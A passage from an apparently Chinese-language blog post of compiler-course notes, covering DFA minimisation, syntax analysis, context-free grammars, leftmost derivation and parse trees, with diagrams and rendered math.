<p>N : {q0, q1, q2, q4}</p>
<p>A : {q3, q5}</p>
<p>在 N 中 q0 和 q1 在接受 e 的条件下最终得到的状态还是在 N 的内部。所以可以将其根据 e 拆分成 {q0, q1}, {q2, q4}, {q3, q5}</p>
<p>对于 q2 和 q4 都可以接受 e ，而且最终达到的状态一致，所以不能再进行切分。</p>
<p>q0 和 q1 ，在接受 e 的时候， q0 最终得到还是在 {q0, q1}这个状态的结合中， q1 却会落在 {q2, q4} 的状态中，所以可以将 q0 和 q1 分为 {q0}, {q1}。</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/demo_min_DFA_1.png" alt="demo_min_DFA_1"></p>
<h2 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h2><p><strong>语法分析</strong>：检查记号流的语法合法性，生成抽象语法树。【检查词法分析输出的记号流是否符合规则】</p>
<p>语法分析：是否符合主谓宾语法</p>
<p>语法分析的数学理论：上下文无关文法（CFG）</p>
<p>编译器的常用的语法分析方法有</p>
<ul>
<li><strong>自顶向下分析</strong><ul>
<li>递归下降分析算法（预测分析算法）<ul>
<li>每个非终结符构造一个分析函数</li>
<li>用前看符号指导产生式规则的选择</li>
</ul>
</li>
<li><strong>LL分析算法</strong></li>
<li>动作是 <strong>推导</strong></li>
</ul>
</li>
<li><strong>自底向上分析</strong><ul>
<li><strong>LR分析算法</strong></li>
<li>动作是 <strong>归约</strong></li>
</ul>
</li>
</ul>
<p><strong>文法的概念：</strong></p>
<ul>
<li>组成语言的基本形式是 <strong>句子</strong>（句子是由 <strong>单词序列</strong>构成（单词是由 <strong>基本符号</strong> 组成））</li>
<li>文法是阐述语法的一个工具，语句是语法的实例</li>
</ul>
<h3 id="推导：从非终结符推导至终结符"><a href="#推导：从非终结符推导至终结符" class="headerlink" title="推导：从非终结符推导至终结符"></a><strong>推导：</strong>从非终结符推导至终结符</h3><p>推导分为：</p>
<ul>
<li>最左推导</li>
<li>最右推导（规范推导）</li>
</ul>
<pre class="mermaid">graph TB
    no1[&lt;句子&gt;]--&gt;no2[&lt;主语&gt;]--&gt;no5[&lt;代词&gt;]--&gt;no8[&lt;我&gt;]
    no1--&gt;no3[&lt;谓语&gt;]--&gt;no6[&lt;动词&gt;]--&gt;no9[&lt;喜欢&gt;]
    no1--&gt;no4[&lt;宾语&gt;]--&gt;no7[&lt;名词&gt;]--&gt;no10[&lt;音乐&gt;]</pre>

<h3 id="归约：从终结符归约至非终结符"><a href="#归约：从终结符归约至非终结符" class="headerlink" title="归约：从终结符归约至非终结符"></a><strong>归约：</strong>从终结符归约至非终结符</h3><pre class="mermaid">graph TB
    n0[&lt;我&gt;]--&gt;n3[&lt;代词&gt;]--&gt;n6[&lt;主语&gt;]--&gt;n9[&lt;句子&gt;]
    n1[&lt;喜欢&gt;]--&gt;n4[&lt;动词&gt;]--&gt;n7[&lt;谓语&gt;]--&gt;n9
    n2[&lt;音乐&gt;]--&gt;n5[&lt;名词&gt;]--&gt;n8[&lt;宾语&gt;]--&gt;n9</pre>



<h3 id="上下文无关文法："><a href="#上下文无关文法：" class="headerlink" title="上下文无关文法："></a><strong>上下文无关文法：</strong></h3><ul>
<li><p>上下文无关文法G是一个四元组：G=(T,N,P,S)</p>
<ul>
<li>终结符集合T</li>
<li>非终结符积集合N</li>
<li>产生式规则P<ul>
<li>每条规则形式：X -&gt; β<del>1</del> β<del>2</del> β<del>3</del> … β<del>n</del> <ul>
<li>其中X∈ N，β<del>i</del> ∈（T∪N）</li>
</ul>
</li>
</ul>
</li>
<li>S是唯一的开始符号（非终结符）<ul>
<li>S∈N</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>上下文无关文法例子：</strong></p>
<ul>
<li><p>例子1</p>
<ul>
<li><pre><code class="上下文无关文法">S-&gt;N,V,N
N -&gt; s
   | t
   | g
   | w
V -&gt; e
   | d
   
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line">  - G=(N,T,P,S)</span><br><span class="line">  </span><br><span class="line">    非终结符N={S,N,V}</span><br><span class="line">  </span><br><span class="line">    终结符T={s,t,g,w,e,d}</span><br><span class="line">  </span><br><span class="line">    开始符号：S</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">- 例子2</span><br><span class="line"></span><br><span class="line">  - ```上下文无关文法</span><br><span class="line">    E-&gt;num</span><br><span class="line">      | id</span><br><span class="line">      | E + E</span><br><span class="line">      | E * E</span><br><span class="line">      </span><br></pre></td></tr></table></figure></div>
</code></pre>
</li>
<li><p>G=(N,T,P,S)</p>
<p>非终结符N={E}</p>
<p>终结符T={num,id,+,*}</p>
<p>开始符号：E</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="最左推导："><a href="#最左推导：" class="headerlink" title="最左推导："></a><strong>最左推导：</strong></h3><p>每次总是选择最左侧的符号进行替换</p>
<p>定义文法G1如下:</p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="21.057ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 9307.3 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"/></g><g data-mml-node="mo" transform="translate(1063.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2119.6,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"/></g><g data-mml-node="mi" transform="translate(616,-150) scale(0.707)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"/></g></g><g data-mml-node="mo" transform="translate(1293.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="msub" transform="translate(1738.6,0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"/></g><g data-mml-node="mi" transform="translate(616,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g></g><g data-mml-node="mo" transform="translate(2902.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(3347,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g><g data-mml-node="mo" transform="translate(4098,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(4542.7,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g></g><g data-mml-node="mi" transform="translate(7307.3,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">其</text></g><g data-mml-node="mi" transform="translate(8307.3,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">中</text></g></g></g></svg></mjx-container>     </p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="8.033ex" height="2.034ex" role="img" focusable="false" viewbox="0 -705 3550.5 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"/></g><g data-mml-node="mi" transform="translate(616,-150) scale(0.707)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"/></g></g><g data-mml-node="mo" transform="translate(1571.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2627.5,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g></g><g data-mml-node="mo" transform="translate(3272.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g></g></g></svg></mjx-container></p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="9.453ex" height="2.009ex" role="img" focusable="false" viewbox="0 -694 4178 888"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"/></g><g data-mml-node="mi" transform="translate(616,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g></g><g data-mml-node="mo" transform="translate(1441.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2497.4,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(529,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(973.7,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g></g><g data-mml-node="mo" transform="translate(3900,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g></g></g></svg></mjx-container></p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="21.474ex" height="2.034ex" role="img" focusable="false" viewbox="0 -705 9491.3 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g><g data-mml-node="mo" transform="translate(1028.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2084.6,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mo" transform="translate(922.8,0)"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(2200.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(2729.6,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mi" transform="translate(3374.6,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mo" transform="translate(3803.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(4248.2,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mo" transform="translate(5171,0)"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(6448.8,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(6977.8,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g></g></g></g></svg></mjx-container>           </p>
<h3 id="分析树："><a href="#分析树：" class="headerlink" title="分析树："></a><strong>分析树：</strong></h3><ul>
<li><p>推导可以表达成树状结构</p>
</li>
<li><p>特点：</p>
<ul>
<li>树中的每个 <strong>内部节点</strong>代表 <strong>非终结符</strong></li>
<li>每个叶子节点代表 <strong>终结符</strong></li>
<li>每一步推导代表如何从双亲节点生成它的直接孩子节点</li>
</ul>
</li>
<li><pre><code class="分析树">E-&gt;num
 | id
 | E+E
 | E*E
 
